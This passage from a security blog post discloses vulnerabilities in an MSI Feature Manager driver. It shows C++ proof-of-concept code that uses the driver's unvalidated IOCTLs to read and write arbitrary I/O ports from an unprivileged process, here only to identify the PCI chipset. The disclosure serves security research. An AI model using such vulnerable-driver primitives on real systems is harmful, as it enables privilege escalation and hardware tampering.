+<p><img src="/images/posts/msi_feature_manager_cve-9.png" alt="msi_feature_manager_cve-9" /></p>
+<p><img src="/images/posts/msi_feature_manager_cve-10.png" alt="msi_feature_manager_cve-10" /></p>
+<p>The driver exposes direct wrappers around the <code>__in</code> and <code>__out</code> assembly instructions. Any local, unprivileged application can send an IOCTL request specifying any hardware port on the system, allowing completely unrestricted I/O port read and write primitives.</p>
+<h2 id="proof-of-concept-utilizing-i-o-port-access-for-hardware-chipset-identification"><a class="zola-anchor" href="#proof-of-concept-utilizing-i-o-port-access-for-hardware-chipset-identification" aria-label="Anchor link for: proof-of-concept-utilizing-i-o-port-access-for-hardware-chipset-identification">Proof of Concept: Utilizing I/O Port Access for Hardware Chipset Identification</a></h2>
+<p>Below is a brief walkthrough highlighting the core logic of the implementation to demonstrate how the driver's unvalidated IOCTL handlers can be utilized to directly interface with I/O ports. Unlike the previous token manipulation section, this code does not execute an exploit. Instead, it serves as a proof of utilizing arbitrary I/O port access from an unprivileged process. For the complete source code, refer to the repository:</p>
+<p><a rel="external" href="https://github.com/readmsr/MSI_FeatureManager_CVE/blob/master/io_port/io_port.cpp">MSI_FeatureManager_CVE/io_port/io_port.cpp at master · readmsr/MSI_FeatureManager_CVE</a></p>
+<p>Obtaining driver handle:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="cpp"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span>HANDLE driver_handle</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> CreateFileW</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">L&quot;</span><span style="color: #F5C2E7;">\\\\</span><span style="color: #A6E3A1;">.</span><span style="color: #F5C2E7;">\\</span><span style="color: #A6E3A1;">WinIo&quot;</span><span style="color: #9399B2;">,</span><span> GENERIC_READ</span><span style="color: #94E2D5;"> |</span><span> GENERIC_WRITE</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 3</span><span style="color: #9399B2;">,</span><span style="color: #F38BA8;"> nullptr</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 3</span><span style="color: #9399B2;">,</span><span> FILE_ATTRIBUTE_NORMAL</span><span style="color: #9399B2;">,</span><span style="color: #F38BA8;"> nullptr</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span>driver_handle</span><span style="color: #94E2D5;"> ==</span><span> INVALID_HANDLE_VALUE</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Failed to grab driver handle.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cin</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;font-style: italic;">get</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Grabbed driver handle.</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span></code></pre>
+<p>Setting the specific bitmask to Bus, Device, Function, and Register Offset bits at 0, the location of the chipset's Vendor and Device ID registers and sending an IOCTL request to configure the address to write:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="cpp"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span style="color: #9399B2;font-style: italic;">// Bit 31: Enable Bit (Must be 1)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span><span style="color: #9399B2;font-style: italic;">// Bits 23-16: Bus Number (0)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span style="color: #9399B2;font-style: italic;">// Bits 15-11: Device Number (0)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span><span style="color: #9399B2;font-style: italic;">// Bits 10-8: Function Number (0)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span style="color: #9399B2;font-style: italic;">// Bits 7-2: Register Offset (0x00 for Vendor/Device ID)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #9399B2;font-style: italic;">// Result: 0x80000000</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #CBA6F7;">unsigned int</span><span> pci_address</span><span style="color: #94E2D5;"> =</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">80000000</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span>port_write_request write_req</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> {</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">CF8</span><span style="color: #9399B2;">,</span><span> pci_address</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 4</span><span style="color: #9399B2;"> };</span><span style="color: #9399B2;font-style: italic;"> // CONFIG_ADDRESS</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span><span>DWORD bytes</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">10</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span style="color: #94E2D5;">!</span><span style="color: #89B4FA;font-style: italic;">DeviceIoControl</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">,</span><span> IOCTL_WRITE_IO_PORT</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> &amp;</span><span>write_req</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span>port_write_request</span><span style="color: #9399B2;">),</span><span style="color: #F38BA8;"> nullptr</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> &amp;</span><span>bytes</span><span style="color: #9399B2;">,</span><span style="color: #F38BA8;"> nullptr</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">11</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">12</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Failed to write to 0xCF8.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">13</span><span style="color: #89B4FA;font-style: italic;">    CloseHandle</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">14</span><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">15</span><span style="color: #9399B2;">}</span></span></code></pre>
+<p>Once the target hardware address is locked to port 0xCF8, the chipset makes that device's data available on port 0xCFC (CONFIG_DATA). To read it, the process targets port 0xCFC and sends an IOCTL request, specifying the variable pci_data to catch the incoming data. Then the process performs some basic bit-shift operations to isolate the Vendor and Device ID's and prints the detected chipset on the console.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="cpp"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span>port_read_request read_req</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> {</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">CFC</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 4</span><span style="color: #9399B2;"> };</span><span style="color: #9399B2;font-style: italic;"> // CONFIG_DATA</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span><span>DWORD pci_data</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span style="color: #94E2D5;">!</span><span style="color: #89B4FA;font-style: italic;">DeviceIoControl</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">,</span><span> IOCTL_READ_IO_PORT</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> &amp;</span><span>read_req</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span>port_read_request</span><span style="color: #9399B2;">),</span><span style="color: #94E2D5;"> &amp;</span><span>pci_data</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span>DWORD</span><span style="color: #9399B2;">),</span><span style="color: #94E2D5;"> &amp;</span><span>bytes</span><span style="color: #9399B2;">,</span><span style="color: #F38BA8;"> nullptr</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Failed to read from 0xCFC.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #89B4FA;font-style: italic;">    CloseHandle</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span><span style="color: #CBA6F7;">unsigned short</span><span> vendor_id</span><span style="color: #94E2D5;"> =</span><span> pci_data</span><span style="color: #94E2D5;"> &amp;</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFFF</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">10</span><span style="color: #CBA6F7;">unsigned short</span><span> device_id</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> (</span><span>pci_data</span><span style="color: #94E2D5;"> &gt;&gt;</span><span style="color: #FAB387;"> 16</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> &amp;</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFFF</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">11</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Successfully read Bus 0, Device 0, Function 0</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">12</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Raw 32-bit data: 0x&quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> pci_data</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">13</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Vendor ID: 0x&quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> vendor_id</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">14</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Device ID: 0x&quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> device_id</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">15</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span>vendor_id</span><span style="color: #94E2D5;"> ==</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">8086</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">16</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Intel chipset detected.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">17</span><span style="color: #CBA6F7;">else if</span><span style="color: #9399B2;"> (</span><span>vendor_id</span><span style="color: #94E2D5;"> ==</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">1022</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">18</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;AMD chipset detected.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">19</span><span style="color: #CBA6F7;">else</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">20</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Unknown vendor.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">21</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Press enter to exit.&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">22</span><span style="color: #89B4FA;font-style: italic;">CloseHandle</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">23</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cin</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;font-style: italic;">get</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">24</span><span style="color: #CBA6F7;">return</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span></code></pre><h2 id="results-1"><a class="zola-anchor" href="#results-1" aria-label="Anchor link for: results-1">Results</a></h2>
+<p><img src="/images/posts/msi_feature_manager_cve-11.png" alt="msi_feature_manager_cve-11" /></p>
+
+            </section>
+        </article>
+    </main>
+</div>
+
+
+
+            
+                
+            
+
+            
+        </div>
+
+        <div class="right-content">
+            
+    
+    
+        <div class="toc">
+    <div class="heading">
+        Table of Contents
+    </div>
+    <ul class="toc-list">
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#background">Background</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#disclosure-timeline">Disclosure Timeline</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#vulnerability-overview">Vulnerability Overview</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#detailed-analysis-of-the-physical-memory-mapping-vulnerability">Detailed Analysis of the Physical Memory Mapping Vulnerability</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#proof-of-concept-leveraging-physical-memory-access-for-process-token-manipulation">Proof of Concept: Leveraging Physical Memory Access for Process Token Manipulation</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#results">Results</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#detailed-analysis-of-the-arbitrary-i-o-port-read-and-write-vulnerability">Detailed Analysis of the Arbitrary I/O Port Read and Write Vulnerability</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#proof-of-concept-utilizing-i-o-port-access-for-hardware-chipset-identification">Proof of Concept: Utilizing I/O Port Access for Hardware Chipset Identification</a>
+
+                
+            </li>
+        
+            <li class="parent">
+                
+                <a href="https://readmsr.github.io/posts/msi-feature-manager-cve/#results-1">Results</a>
+
+                
+            </li>
+        
+    </ul>
+</div>
+
+    
+
+        </div>
+        
+
+    </body>
+
+</html>
